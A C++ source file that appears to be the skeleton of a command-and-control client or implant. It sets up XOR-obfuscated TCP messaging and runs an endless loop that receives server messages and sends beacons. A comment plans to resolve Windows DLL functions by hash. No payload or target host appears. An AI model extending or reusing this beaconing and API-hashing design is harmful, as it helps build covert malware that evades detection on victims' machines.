#include "ClientSubsystem.h"
#include "ComponentFactory.h"

#include <iostream>


// TODO: rename to ClientController? 
ClientSubsystem::ClientSubsystem()
{
	// loadConfig?
	// enable debugging messages (depending on config?)
	setupSubcomponents();
	setupMessaging();
	// setupEvents();
	// setupTasks();
}

ClientSubsystem::~ClientSubsystem()
{
	if (messageHandler_)
	{
		delete messageHandler_;
		//messageHandler_ = 0;
	}

	if (transportLayer_)
	{
		delete transportLayer_;
		//transportLayer_ = 0;
	}
}

void ClientSubsystem::setupMessaging()
{

	//transportLayer_ = TransportLayerFactory::create(TransportLayerType::TCP);
	transportLayer_ = TransportLayerFactory::create(TransportLayerType::TCP, encryptor_);
	// TODO: check that serializer and encoder are not null first?
	messageHandler_ = new MessageHandler(transportLayer_, serializer_, encoder_);

	dispatcher_ = new Dispatcher();
	controller_ = new Controller();
}

// rename to setupCallbacks ? 
void ClientSubsystem::setupEvents()
{
	/*
	transportLayer_->setReceiveCallback([this](RawByteBuffer& bytes)
		{
			messageHandler_->handle(bytes);
		}
	);*/

	transportLayer_->setOnMessage([&](const RawByteBuffer& msg)
	{
			messageHandler_->handle(msg);
	});

	messageHandler_->setOnMessage([&](const InternalMessage& msg)
	{
			dispatcher_->dispatch(msg);
	});

	dispatcher_->registerHandler(MessageType::DEFAULT, [&](const InternalMessage& msg)
		{
			controller_->handleDefault(msg);
		});
}

void ClientSubsystem::setupTasks()
{

}

void ClientSubsystem::setupSubcomponents()
{
	/*
	serializer_ = new Serializer();
	encoder_ = new Encoder();
	encryptor_ = new Encryptor();
	*/
	serializer_ = new BinarySerializer();
	encoder_ = new Base64Encoder();
	encryptor_ = new XorEncryptor();
}

void ClientSubsystem::run() // TODO: rename to start??
{	
	//Config* config = loadConfig();
	//Config config = loadConfig();

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/
	//std::cout << "ClientSubsystem::run()" << std::endl;

	// transportLayer_->connect();
	// std::thread t([this] { transportLayer_->run(); });
	// t.detach();

	/*
	while (true)
	{
		if (!transportLayer_->isConnected())
		{
			transportLayer_->connect();
		}

		if (transportLayer_->isConnected())
		{
			transportLayer_->beacon();
		}
		Sleep(5000);
	}*/

	while (true)
	{
		transportLayer_->update(); // this just receives messages from server

		// TODO:
		// transportLayer_->receive(); ?

		transportLayer_->beacon();
	}
}
